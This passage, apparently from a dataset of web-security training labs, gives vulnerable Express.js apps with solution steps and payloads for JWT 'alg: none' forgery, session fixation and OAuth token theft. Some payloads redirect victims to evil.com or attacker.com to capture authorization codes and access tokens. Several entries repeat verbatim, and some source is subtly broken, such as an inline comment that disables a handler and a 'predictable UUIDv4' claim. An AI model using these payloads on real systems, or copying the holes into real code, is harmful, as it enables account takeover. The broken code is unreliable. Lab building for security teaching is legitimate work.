    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const secret = 'supersecretjwtkey'; const users = [{ username: 'admin', role: 'admin' }]; const schema = buildSchema(` type Query { currentUser: String } type Mutation { generateToken(secret: String!): String } `); const root = { currentUser: (args, req) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); return decoded.role; } catch (e) { return 'unauthorized'; } }, generateToken: ({ secret }) => { if (secret.length < 8) throw new Error(`Secret too short: expected >8, got ${secret.length}`); return jwt.sign({ role: 'user' }, secret); } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); const PORT = 4000; app.listen(PORT, () => console.log(`GraphQL Lab running at http://localhost:${PORT}/graphql`));",
    "payloads": [
      "{\"query\": \"mutation { generateToken(secret: \\\"123\\\") }\"}",
      "Header: Authorization: Bearer <forged JWT signed with leaked key>",
      "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\" }.<signature>"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth redirect handling",
    "Lab Description": "This app integrates with an external OAuth provider for login. The application does not validate that the `state` parameter maps to the initiating session, enabling session fixation. To solve: hijack a victim’s session by initiating login and forcing a reused session ID through manipulated OAuth flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the OAuth login flow and observe the `state` parameter.",
      "2. Initiate login as attacker, then copy your session cookie.",
      "3. Send crafted OAuth URL to victim with fixed `state` and redirect_uri, making victim complete auth.",
      "4. Victim is redirected and binds session to attacker-controlled session ID.",
      "5. Reuse session token in Burp to access victim account under fixed session context."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const axios = require('axios'); const app = express(); app.use(cookieParser()); let sessions = {}; app.get('/login', (req, res) => { const state = Math.random().toString(36).substring(2); sessions[state] = {}; res.redirect(`https://oauth-provider.com/auth?state=${state}&redirect_uri=http://localhost:4000/callback`); }); app.get('/callback', (req, res) => { const { state, code } = req.query; axios.post('https://oauth-provider.com/token', { code }).then(resp => { const userInfo = resp.data.user; sessions[state].user = userInfo; res.cookie('session', state); res.redirect('/account'); }); }); app.get('/account', (req, res) => { const session = req.cookies.session; if (sessions[session] && sessions[session].user) res.send(`Welcome ${sessions[session].user.username}`); else res.send('Not logged in'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Session Fixation Lab on http://localhost:${PORT}`));",
    "payloads": [
      "https://oauth-provider.com/auth?state=attacker123&redirect_uri=http://localhost:4000/callback",
      "Cookie: session=attacker123",
      "GET /callback?state=attacker123&code=valid-oauth-code"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm acceptance",
    "Lab Description": "The application uses stateless JWT tokens for user authentication. The JWT validation logic improperly accepts unsigned tokens with the 'none' algorithm. To solve: forge a token impersonating the admin user with alg=none and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept your login token and decode it using jwt.io.",
      "2. Change the payload to `{ \"username\": \"admin\", \"role\": \"admin\" }`.",
      "3. Set JWT header `alg` to `none` and remove the signature.",
      "4. Replace your session cookie with the modified token.",
      "5. Access /admin and verify privileged access granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, 'secret123'); res.send({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') return res.send(`Admin panel - Welcome ${payload.payload.username}`); const verified = jwt.verify(token, 'secret123'); if (verified.role === 'admin') return res.send('Admin panel access granted'); else res.send('Not an admin'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "Header: Authorization: Bearer <none-algorithm-token>",
      "{ \"alg\": \"none\" }.{ \"username\": \"admin\", \"role\": \"admin\" }."
    ]
  },
  {
    "Lab scenario": "Session ID predictable in SOAP-based login service",
    "Lab Description": "The application provides a legacy SOAP login service that generates sessions using predictable UUIDv4. By analyzing responses, an attacker can brute-force valid sessions. To solve: predict Carlos’s session token and access his profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use OWASP ZAP to send multiple login requests to /soapLoginService and observe pattern of session IDs returned in Set-Cookie.",
      "2. Use a Node script with UUID generator to generate next likely session ID.",
      "3. Replay a GET /profile request with the guessed session cookie using Postman.",
      "4. Verify access to Carlos’s profile page is granted via the guessed session.",
      "5. Flag obtained session as valid and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const uuid = require('uuid'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text({ type: 'application/soap+xml' })); let sessions = {}; app.post('/soapLoginService', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Malformed SOAP'); const [_, username, password] = match; if (username === 'carlos' && password === 'password123') { const sessionId = uuid.v4(); sessions[sessionId] = username; res.setHeader('Set-Cookie', `session=${sessionId}`); res.send(`<soap:Envelope><soap:Body>Login Success</soap:Body></soap:Envelope>`); } else res.send(`<soap:Envelope><soap:Body>Login Failed</soap:Body></soap:Envelope>`); }); app.get('/profile', (req, res) => { const session = req.headers.cookie?.split('=')[1]; if (sessions[session]) res.send(`Profile of ${sessions[session]}`); else res.send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`SOAP Session ID Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "<soap:Envelope><soap:Body><username>carlos</username><password>password123</password></soap:Body></soap:Envelope>",
      "Cookie: session=generated-uuid-approximation",
      "GET /profile with guessed session header"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token validation endpoint",
    "Lab Description": "The application uses JWT for authentication and accepts tokens via the Authorization header. The backend attempts to verify the JWT signature using the algorithm specified in the token's header. This results in a classic 'algorithm confusion' flaw, where changing the algorithm to 'none' skips signature validation entirely. To solve: craft a tampered JWT granting access to the administrator’s dashboard without the original signing key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid login using Burp Suite and capture the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Postman to observe the header and payload. Note the original algorithm used (e.g., HS256).",
      "Modify the token header to use \"alg\":\"none\" and change the payload to {\"username\":\"admin\"}.",
      "Reconstruct the JWT without a signature (no third part), and replace the Authorization header value with this tampered token.",
      "Send the request to the /admin endpoint and verify access to the administrator panel is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass' }, { username: 'user', password: 'userpass' }]; const secret = 'topsecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username: user.username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') return res.send('Admin panel'); } try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Admin panel'); } catch (e) { return res.status(401).send('Access Denied'); } res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation via login handler",
    "Lab Description": "This application fails to regenerate the session ID after successful login. An attacker can set a known session ID before login and later trick the victim to authenticate, thereby gaining control over the authenticated session. To solve: hijack Carlos's session by pre-setting a session cookie and waiting for him to log in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to visit the site and set a fixed session ID like sessionid=attacker123 before login.",
      "Send the fixed session link to Carlos using the /send-message endpoint that simulates user email delivery.",
      "Wait until Carlos logs in and his session is bound to sessionid=attacker123.",
      "Reuse the same sessionid cookie in a new browser session and access /my-account.",
      "Verify that Carlos’s account is accessible using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/', (req, res) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = {}; } res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.username === 'carlos') return res.send('Carlos account accessed'); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: sessionid=attacker123",
      "Access Carlos login endpoint while sharing same sessionid cookie"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allows token reuse across clients",
    "Lab Description": "The application uses OAuth2 for login via a third-party identity provider. However, the backend fails to validate the 'aud' (audience) claim in ID tokens, allowing a token from another client app to be reused in this one. To solve: use a token issued to another client to access the target protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register a malicious client with the same identity provider and log in to retrieve a valid OAuth2 ID token.",
      "Capture the token from your app and inspect its payload using jwt.io. Note the audience is set to 'attacker-client'.",
      "Send a request to the target app’s /oauth-login endpoint using the same token in a Bearer header.",
      "Since the backend fails to validate the audience, it accepts the token and grants access.",
      "Access the /sensitive-data endpoint using the token and confirm it belongs to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sensitiveData = { 'carlos': 'flag{supersecret}' }; app.post('/oauth-login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, '', { ignoreExpiration: true }); // Signature skipped for demo if (decoded && decoded.sub === 'carlos') { res.cookie('session', 'oauthsession'); res.send('Login accepted'); } else { res.status(401).send('Invalid sub'); } } catch (err) { res.status(400).send('Bad token'); } }); app.get('/sensitive-data', (req, res) => { if (req.cookies.session === 'oauthsession') return res.send(sensitiveData['carlos']); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Reuse Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Bearer eyJhbGciOi... (ID token with sub=carlos, aud=attacker-client)",
      "POST /oauth-login { token: '...' }"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token validation endpoint",
    "Lab Description": "The application uses JWT for authentication and accepts tokens via the Authorization header. The backend attempts to verify the JWT signature using the algorithm specified in the token's header. This results in a classic 'algorithm confusion' flaw, where changing the algorithm to 'none' skips signature validation entirely. To solve: craft a tampered JWT granting access to the administrator’s dashboard without the original signing key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid login using Burp Suite and capture the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Postman to observe the header and payload. Note the original algorithm used (e.g., HS256).",
      "Modify the token header to use \"alg\":\"none\" and change the payload to {\"username\":\"admin\"}.",
      "Reconstruct the JWT without a signature (no third part), and replace the Authorization header value with this tampered token.",
      "Send the request to the /admin endpoint and verify access to the administrator panel is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass' }, { username: 'user', password: 'userpass' }]; const secret = 'topsecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username: user.username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') return res.send('Admin panel'); } try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Admin panel'); } catch (e) { return res.status(401).send('Access Denied'); } res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation via login handler",
    "Lab Description": "This application fails to regenerate the session ID after successful login. An attacker can set a known session ID before login and later trick the victim to authenticate, thereby gaining control over the authenticated session. To solve: hijack Carlos's session by pre-setting a session cookie and waiting for him to log in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to visit the site and set a fixed session ID like sessionid=attacker123 before login.",
      "Send the fixed session link to Carlos using the /send-message endpoint that simulates user email delivery.",
      "Wait until Carlos logs in and his session is bound to sessionid=attacker123.",
      "Reuse the same sessionid cookie in a new browser session and access /my-account.",
      "Verify that Carlos’s account is accessible using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/', (req, res) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = {}; } res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.username === 'carlos') return res.send('Carlos account accessed'); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: sessionid=attacker123",
      "Access Carlos login endpoint while sharing same sessionid cookie"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allows token reuse across clients",
    "Lab Description": "The application uses OAuth2 for login via a third-party identity provider. However, the backend fails to validate the 'aud' (audience) claim in ID tokens, allowing a token from another client app to be reused in this one. To solve: use a token issued to another client to access the target protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register a malicious client with the same identity provider and log in to retrieve a valid OAuth2 ID token.",
      "Capture the token from your app and inspect its payload using jwt.io. Note the audience is set to 'attacker-client'.",
      "Send a request to the target app’s /oauth-login endpoint using the same token in a Bearer header.",
      "Since the backend fails to validate the audience, it accepts the token and grants access.",
      "Access the /sensitive-data endpoint using the token and confirm it belongs to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sensitiveData = { 'carlos': 'flag{supersecret}' }; app.post('/oauth-login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, '', { ignoreExpiration: true }); // Signature skipped for demo if (decoded && decoded.sub === 'carlos') { res.cookie('session', 'oauthsession'); res.send('Login accepted'); } else { res.status(401).send('Invalid sub'); } } catch (err) { res.status(400).send('Bad token'); } }); app.get('/sensitive-data', (req, res) => { if (req.cookies.session === 'oauthsession') return res.send(sensitiveData['carlos']); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Reuse Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Bearer eyJhbGciOi... (ID token with sub=carlos, aud=attacker-client)",
      "POST /oauth-login { token: '...' }"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Legacy Cookie Reuse in REST Login Flow",
    "Lab Description": "The application implements session tracking using a legacy session cookie `sid`, which is not regenerated on successful login. This flaw allows session fixation if a valid but unauthenticated session ID is issued prior to login. To solve: hijack Carlos’s session by fixing the session ID before he logs in, then access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the GET /login request and capture the `Set-Cookie: sid` header for your own unauthenticated session.",
      "Forward the login request but do not complete the login process. In Burp, send a crafted phishing email link to Carlos using POST /message with the fixed `sid` as a cookie.",
      "Wait for Carlos to log in using the fixed session ID. Use Burp to monitor active sessions with /admin/session-logs.",
      "Once Carlos is authenticated on the fixed session, reuse the session ID cookie to access /my-account.",
      "Verify Carlos’s name in the response and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = null; res.cookie('sid', sid); res.send('<form method=\"POST\">...</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) res.send(`Welcome ${user}`); else res.send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /login",
      "Set fixed sid cookie before user logs in",
      "Reuse sid after user logs in"
    ]
  },
  {
    "Lab scenario": "JWT Signature Confusion via alg None in GraphQL Auth",
    "Lab Description": "This application uses JWTs for GraphQL-based authentication. It parses the `Authorization: Bearer` token without validating the `alg` parameter securely. The server allows tokens signed with `alg: none`, enabling tampering. To solve: forge a JWT token for the user 'carlos' and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a valid login mutation to /graphql and capture the JWT in the response.",
      "Decode the token and analyze its header and payload using jwt.io. Observe the use of HS256.",
      "Replace the alg value with none and modify the payload sub to carlos. Remove the signature part.",
      "Resend the forged token as Authorization: Bearer <fake_jwt> in a GET /graphql?query={me{name}} request.",
      "Verify the returned user is carlos and access /graphql?query={accountData} to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; const users = { 'carlos': 'hunter2', 'alice': 'test123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else res.status(401).json({ error: 'Invalid' }); }); app.use('/graphql', (req, res, next) => { const auth = req.headers.authorization || ''; const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded.sub; next(); } catch (e) { res.status(403).json({ error: 'Invalid token' }); } }); app.post('/graphql', (req, res) => { if (req.body.query.includes('me')) { res.json({ data: { me: { name: req.user } } }); } else res.json({ data: null }); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Authorization: Bearer header with alg: none",
      "JWT: {\"alg\":\"none\"}.{\"sub\":\"carlos\"}.",
      "GraphQL query: {me{name}}"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception in Hybrid Flow",
    "Lab Description": "The OAuth flow implemented by this app uses a hybrid response type (code token) and redirects the user to a fixed redirect_uri vulnerable to open redirect attacks. To solve: intercept Carlos’s authorization code and complete the login flow using it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to identify that the redirect_uri parameter in the auth request is vulnerable to open redirect.",
      "Craft a malicious authorization URL and send it to Carlos, where redirect_uri points to your attacker site.",
      "Capture the authorization code from the redirected URL containing /?code=xyz.",
      "Replay the intercepted code in a POST /oauth/token request with grant_type=authorization_code and redirect_uri=http://trusted-site.com.",
      "Use the obtained access_token in GET /account?access_token=xyz to access Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const codes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type, user } = req.query; if (user === 'carlos') { const code = Math.random().toString(36).slice(2); codes[code] = user; res.redirect(`${redirect_uri}?code=${code}`); } else res.send('Unauthorized'); }); app.post('/oauth/token', (req, res) => { const { code, grant_type, redirect_uri } = req.body; if (codes[code]) { const token = Math.random().toString(36).slice(2); tokens[token] = codes[code]; res.json({ access_token: token }); } else res.status(400).json({ error: 'Invalid code' }); }); app.get('/account', (req, res) => { const token = req.query.access_token; if (tokens[token]) res.send(`Welcome ${tokens[token]}`); else res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Code Interception Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://example.com/authorize?client_id=abc&redirect_uri=https://evil.com&response_type=code&user=carlos",
      "Intercepted code in redirect: https://evil.com/?code=abc123",
      "POST /oauth/token with code=abc123&grant_type=authorization_code&redirect_uri=http://trusted-site.com"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie-based Authentication",
    "Lab Description": "The application improperly reuses existing session identifiers during login. The session ID issued before authentication remains valid after successful login. To solve: Fixate a session for the victim, trick them into logging in, then hijack the session to access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to register a new account and intercept the Set-Cookie header to extract your pre-login session ID.",
      "Craft a phishing page or link embedding the fixed session ID in the user's browser.",
      "Send the phishing link to the victim or simulate login as victim in a separate browser profile reusing the fixed session ID.",
      "Login as the victim using valid credentials while reusing the fixed session ID.",
      "Revert to the attacker's browser session and access /dashboard to confirm hijacked access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.sid]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Access denied'); }); app.use((req, res, next) => { if (!req.cookies.sid) res.cookie('sid', Math.random().toString(36).substring(2)); next(); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab on http://localhost:${PORT}`));",
    "payloads": [
      "Set attacker-controlled sid cookie in victim browser before login",
      "Use shared sid across login session for fixation",
      "Access /dashboard after victim login using fixed session ID"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in Bearer Authentication",
    "Lab Description": "The application trusts the 'alg' header of JWTs and does not validate the token signature when 'alg' is set to 'none'. To solve: Forge a JWT token with alg set to 'none' and impersonate the victim by injecting their username into the payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT after logging in as any user.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the 'alg' value and payload.",
      "Modify the 'alg' header to 'none' and set the payload sub to 'carlos'.",
      "Re-encode the header and payload using Base64URL without a signature.",
      "Send the forged token in Authorization: Bearer header and access /private-profile to confirm impersonation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtsecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ sub: user.username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/private-profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('Forbidden'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Welcome ${payload.sub}`); } else { jwt.verify(token, 'secret'); res.send('Access granted'); } } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 3002; app.listen(PORT, () => console.log(`JWT Confusion Lab on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "{ \"alg\": \"none\" }, { \"sub\": \"carlos\" }",
      "Authorization: Bearer <forged-JWT>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Implicit Grant Flow",
    "Lab Description": "The OAuth provider exposes the access token in the redirect URI fragment and the relying party accepts it without origin validation. To solve: Steal an access token issued to Carlos using a malicious redirect_uri and use it to access the protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login flow in browser and observe the redirect_uri and response_type in the URL.",
      "Craft a malicious authorization request URL with response_type=token and redirect_uri set to a domain under your control (e.g. http://attacker.com).",
      "Simulate Carlos clicking the malicious link to initiate OAuth login and receive token in fragment.",
      "Capture the token in the attacker's server log from the redirect URI fragment.",
      "Use Postman to include the stolen token in Authorization header and access /api/userinfo."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { 'carlos-token': 'carlos' }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = 'carlos-token'; res.redirect(`${redirect_uri}#access_token=${token}`); } else res.status(400).send('Invalid response type'); }); app.get('/api/userinfo', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const user = tokens[token]; if (user) res.send(`User info for ${user}`); else res.status(403).send('Invalid token'); }); const PORT = 3003; app.listen(PORT, () => console.log(`OAuth Implicit Flow Lab on http://localhost:${PORT}`));",
    "payloads": [
      "http://localhost:3003/oauth/authorize?response_type=token&client_id=app123&redirect_uri=http://attacker.com",
      "#access_token=carlos-token",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in REST session management path parameter",
    "Lab Description": "The application's session management system accepts session tokens via a URL path parameter, creating a critical session fixation risk. An attacker can craft a link with a preset session token and trick users into using it. The application ties sessions only by token without verifying ownership. To solve: hijack Carlos's session using a fixation attack and access his My Account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to inspect the login flow. Observe the session token in the URL path: /session/{token}.",
      "Send a crafted session token to your own account and verify its reuse by logging in again.",
      "Login using the malicious session token in another browser and notice session reuse is allowed.",
      "Send Carlos a crafted URL using your own valid token: /session/fixedToken.",
      "Once Carlos clicks the URL and authenticates, reuse the same session token to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'carlospass' }]; const sessions = {}; app.get('/session/:token', (req, res) => { const token = req.params.token; if (!sessions[token]) sessions[token] = { authenticated: false }; res.send(`Session: ${token}`); }); app.post('/login/:token', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = req.params.token; sessions[token] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(403).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const token = req.query.token; if (sessions[token]?.authenticated && sessions[token].user === 'carlos') res.send('Welcome to Carlos account'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /session/fixedtoken",
      "POST /login/fixedtoken?username=carlos&password=carlospass",
      "GET /my-account?token=fixedtoken"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in GraphQL Authorization Header",
    "Lab Description": "This GraphQL API uses JWTs for authentication but does not validate the 'alg' field properly. When 'alg' is set to 'none', the backend fails to verify the signature. The JWT is passed via the Authorization header and decoded without proper validation. To solve: forge a token with 'alg:none' and access Carlos's user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to inspect the GraphQL endpoint with a valid Authorization: Bearer <JWT>.",
      "Decode the JWT using jwt.io and observe the header, payload, and signature.",
      "Craft a new JWT with 'alg':'none' and payload { \"username\": \"carlos\" } and remove the signature.",
      "Replay the token via Authorization header against the GraphQL endpoint.",
